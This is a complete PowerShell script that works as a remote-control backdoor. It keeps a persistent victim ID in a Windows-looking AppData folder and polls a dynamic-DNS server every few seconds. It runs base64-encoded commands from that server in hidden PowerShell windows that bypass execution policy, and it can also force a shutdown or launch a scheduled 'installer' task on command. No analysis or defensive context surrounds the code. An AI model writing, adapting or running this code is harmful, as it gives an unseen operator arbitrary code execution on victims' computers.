$m1 = New-Object System.Threading.Mutex($false, "run.exe")
if (-not $m1.WaitOne(0)) {
  Write-Host "ERROR: run.exe mutex already exists"
  exit
}

$m2 = New-Object System.Threading.Mutex($false, "run.ps1")
if (-not $m2.WaitOne(0)) {
  Write-Host "ERROR: run.ps1 mutex already exists"
  exit
}

$VPS_POLL_URL = "http://runx.ddns.net/api/poll"

Write-Host "VPS URL: [$VPS_POLL_URL]"

$IdPath = "$env:APPDATA\Microsoft\run\run.txt"

if (Test-Path $IdPath) {
  $raw = (Get-Content $IdPath -Raw).Trim()

  if ($raw.Length -ge 8) {
    $uniqueId = $raw.Substring(0, 8)
  }
  else {
    $uniqueId = $raw
  }
}
else {
  $uniqueId = ([guid]::NewGuid().ToString()).Substring(0, 8)
  Set-Content -Path $IdPath -Value $uniqueId
}

$uniqueUser = "$($env:USERNAME)-$uniqueId-W"

Write-Host "Username: [$uniqueUser]"

try {
  while ($true) {
    try {
      $u = $VPS_POLL_URL + "?username=" + [System.Uri]::EscapeDataString($uniqueUser)

      Write-Host "Polling URL: [$u]"

      $uri = New-Object System.Uri($u)

      Write-Host "URI Host: [$($uri.Host)]"
      Write-Host "URI Path: [$($uri.AbsolutePath)]"

      $r = Invoke-RestMethod -Method Get -Uri $uri -TimeoutSec 10

      Write-Host "$(Get-Date -Format 'HH:mm:ss') poll OK"

      if ($r.run -eq $true) {
        Write-Host "Command received"

        $c = [System.Text.Encoding]::UTF8.GetString(
          [System.Convert]::FromBase64String($r.cmd)
        )

        if ($c -match "panic") {
          Write-Host "Panic command received"
          exit
        }
        elseif ($c -match "altf4") {
          Write-Host "Shutdown command received"
          Start-Process shutdown -ArgumentList "/s", "/t", "0"
        }
        elseif ($c -match "sauce") {
          Write-Host "Installer command received"
          Start-ScheduledTask -TaskName "WinRunInstaller"
        }
        else {
          $style = if ($r.visible -eq $true) { "Normal" } else { "Hidden" }

          Start-Process powershell.exe -ArgumentList @(
            "-NoProfile",
            "-ExecutionPolicy",
            "Bypass",
            "-Command",
            $c
          ) -WindowStyle $style
        }
      }
    }
    catch {
      Write-Host "POLL ERROR: $($_.Exception.Message)"
      Write-Host "POLL URL: [$u]"
    }

    Start-Sleep -Seconds 3
  }
}
finally {
  if ($m1) {
    $m1.ReleaseMutex()
    $m1.Dispose()
  }

  if ($m2) {
    $m2.ReleaseMutex()
    $m2.Dispose()
  }
}
